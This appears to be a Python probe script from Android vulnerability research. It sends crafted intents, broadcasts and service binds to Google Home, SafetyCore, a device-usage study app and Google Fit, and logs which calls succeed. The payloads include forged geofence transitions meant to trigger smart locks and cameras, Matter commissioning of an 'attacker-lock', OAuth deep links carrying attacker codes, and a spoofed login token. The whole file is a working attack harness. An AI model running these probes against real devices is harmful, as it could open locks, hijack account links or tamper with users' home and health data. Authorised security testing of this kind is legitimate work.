#!/usr/bin/env python3
"""Batch 3: Google Home (Matter/geofence/OAuth) + SafetyCore integrity signal services."""
import json, sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from probe import run

CH = "com.google.android.apps.chromecast.app"
SC = "com.google.android.safetycore"

TESTS = [
 # --- Google Home: Matter (smart-home device commissioning) ---
 ("matter_proxy_direct", {"type":"start","action":"com.google.android.gms.home.matter.ACTION_COMMISSION_DEVICE",
   "pkg": CH, "label":"matter-direct"}),
 ("matter_proxy_explicit", {"type":"start","component":CH+"/com.google.android.apps.chromecast.app.setup.discovery.packages.matter.proxy.MatterSetupProxyActivity",
   "action":"com.google.android.gms.home.matter.ACTION_COMMISSION_DEVICE","label":"matter-explicit"}),
 ("matter_proxy_withextra", {"type":"start","action":"com.google.android.gms.home.matter.ACTION_COMMISSION_DEVICE",
   "extras":{"commissioning_flow":"1","device_name":"attacker-lock"},"label":"matter-extra"}),

 # --- Google Home: geofence / presence transitions (drives locks+cameras) ---
 ("geo_transition", {"type":"broadcast","action":"com.google.android.apps.chromecast.app.gf.GF_TRANSITION",
   "extras":{"transition":"ENTER","geofence_id":"attacker_home","lat":"12.9716","lng":"77.5946","accuracy":"5"},
   "label":"geofence-enter"}),
 ("geo_transition_away", {"type":"broadcast","action":"com.google.android.apps.chromecast.app.gf.GF_TRANSITION",
   "extras":{"transition":"EXIT","geofence_id":"attacker_home"},"label":"geofence-exit"}),
 ("geo_boot", {"type":"broadcast","action":"android.intent.action.BOOT_COMPLETED","pkg":CH,"label":"gh-boot"}),
 ("geo_pkg_changed", {"type":"broadcast","action":"android.intent.action.MY_PACKAGE_REPLACED","pkg":CH,"label":"gh-pkg-replaced"}),

 # --- Google Home: OAuth handoff for Cast apps ---
 ("gh_oauth_handoff", {"type":"start","action":"android.intent.action.VIEW",
   "data":"comgooglecast://chromecast.auth.com/offers?code=ATTACKER_CODE&state=ST","label":"gh-oauth-handoff"}),
 ("gh_account_linking", {"type":"start","action":"android.intent.action.VIEW",
   "data":"https://oauth-redirect.googleusercontent.com/a/com.google.android.apps.chromecast.app?code=ATTACKER","label":"gh-acct-linking"}),

 # --- Google Home: WebView deep link host ---
 ("gh_webview_dl", {"type":"start","action":"android.intent.action.VIEW",
   "data":"googlehome://webview/x","label":"gh-webview"}),
 ("gh_setup_dl", {"type":"start","action":"android.intent.action.VIEW",
   "data":"googlehome://setup/x","label":"gh-setup-dl"}),

 # --- SafetyCore: Play Integrity / Safety Signals services ---
 ("sc_simplify", {"type":"bind","pkg":SC,"action":"com.google.android.apps.safetycore.simpleapi.BIND","label":"safetycore-simpleapi"}),
 ("sc_signalstorage", {"type":"bind","pkg":SC,"action":"com.google.android.apps.safetycore.signals.BIND","label":"safetycore-signalstorage"}),
 ("sc_classification", {"type":"bind","pkg":SC,"action":"com.google.android.apps.safetycore.classification.BIND","label":"safetycore-classification"}),

 # --- DeviceUsageStudy simple login ---
 ("dus_simplelogin", {"type":"broadcast","action":"com.google.android.apps.userpanel.ACTION_SEND_SIMPLE_LOGIN",
   "extras":{"token":"attacker","user_id":"1"},"label":"dus-simplelogin"}),
 ("dus_routerid", {"type":"broadcast","action":"com.google.android.apps.userpanel.ACTION_SIMPLE_LOGIN_ROUTER_ID_CHECK",
   "label":"dus-routerid"}),

 # --- Google Fit gateway (health data write) ---
 ("fit_track", {"type":"start","action":"vnd.google.fitness.TRACK","pkg":"com.google.android.apps.fitness","label":"fit-track"}),
 ("fit_view", {"type":"start","action":"vnd.google.fitness.VIEW","pkg":"com.google.android.apps.fitness","label":"fit-view"}),
 ("fit_sleep", {"type":"start","action":"vnd.google.fitness.sleep","pkg":"com.google.android.apps.fitness","label":"fit-sleep"}),
]

if __name__ == "__main__":
    for name, cmd in TESTS:
        out = run(json.dumps(cmd), name, wait=3)
        lines = [l.split("VRPPROBE: ", 1)[-1] for l in out.splitlines() if "VRPPROBE" in l]
        print(f"--- {name}")
        for l in lines:
            if any(k in l for k in ("CMD type", "START ", "BROADCAST ", "BIND ", "BIND_RESULT",
                                    "BIND_CONNECTED", "BIND_FAIL", "SecurityException",
                                    "START_OK", "BROADCAST_SENT", "FAIL", "INTERFACE_")):
                print("   ", l[:300])